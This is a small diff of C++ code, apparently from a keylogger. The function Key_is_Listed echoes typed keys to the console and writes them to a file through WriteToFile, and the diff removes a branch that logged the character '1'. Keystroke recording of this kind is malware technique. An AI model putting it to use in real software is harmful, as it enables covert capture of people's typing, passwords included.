@@ -34,12 +34,6 @@ bool Key_is_Listed(WORD iKey)
 			std::cout << "!";
 			WriteToFile("!");
 		}
-		else
-		{
-			iKey += '1';
-			std::cout << "1";
-			WriteToFile("1");
-		}
 
 	case VK_RETURN:
 		std::cout << "\n";
